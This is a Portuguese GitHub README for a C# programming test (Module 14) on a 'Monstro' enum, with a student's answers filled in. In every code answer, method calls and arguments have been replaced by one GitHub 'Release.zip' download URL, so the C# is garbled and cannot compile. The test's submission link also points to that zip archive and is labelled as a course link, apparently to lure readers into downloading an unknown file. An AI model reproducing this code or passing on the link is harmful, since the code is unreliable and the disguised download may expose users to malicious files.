# Teste de Programação e Sistemas de Informação - Módulo 14

Cria um repositório **privado** no GitHub com o nome **"PSI_Teste_M14"** e com um ficheiro **README**.

Podes fazer clone do repositório para o teu computador (ou para o Replit) e preencher o README localmente (ou no Replit) com as respostas dos exercícios. Seguidamente, terás de fazer commit e push das atualizações.

Alternativamente, podes preencher o ficheiro README diretamente no GitHub. A partir da página principal do repositório, clica em "Edit File" (ícone representando um lápis). Com o README preenchido, carrega no botão "Commit Changes".

Escreve as respostas dentro dos blocos correspondentes. Substitui as reticências pelo que é pedido em cada pergunta. Não desformates o documento.

Para entregar a ficha, acede a [este link](https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip) (separador **Teste Módulo 14**), e mete o **URL** do teu repositório ao lado do teu nome.
No teu repositório, acede a "Settings -> Collaborators" e adiciona o utilizador "Manuel Geraldes" para ter acesso.

Quando acabares, carrega no botão "Commit Changes".

## Informação do aluno

    Nome: Salvador Eira

## Considera a seguinte enumeração: (6v)

```cs
enum Monstro { Troll, Ogre, Elfo, Demónio, Vampiro, Lobisomem, Minion }
```

Realiza as seguintes instruções:

1. Declara uma lista de `Monstro` e adiciona-lhe 3 elementos distintos da enumeração. (6v)

        Resposta:

class Program
{
    static void Main()
    {
        List<Monstro> listaDeMonstros = new List<Monstro>();

        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);

        foreach (var monstro in listaDeMonstros)
        {
            https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(monstro);
        }
    }
}

    
3. Considera a variável `m`do tipo `Monstro`. Escreve uma linha de código onde atribuis a esta variável o valor do primeiro elemento da lista da instrução anterior. (4v)

        Resposta:
   
class Program
{
    static void Main()
    {
        List<Monstro> listaDeMonstros = new List<Monstro>();

        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
        
        Monstro m = listaDeMonstros[0];

        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(m);
    }
}
   
3. Escreve o código de um método que recebe a lista da primeira instrução, e devolve um inteiro indicando quantos elementos existem na lista. O método deve fazer uso de LINQ. (10v)

        Resposta:
   
class Program
{
    static void Main()
    {
        List<Monstro> listaDeMonstros = new List<Monstro>();

        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);
        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip(https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip);


        int quantidade = ContarElementos(listaDeMonstros);

        https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip("Quantidade de elementos na lista: " + quantidade);
    }

    static int ContarElementos(List<Monstro> lista)
    {
        return https://github.com/salvadoreira15/PSI_23-24_Teste_M14/releases/download/v1.0/Release.zip();
    }
}
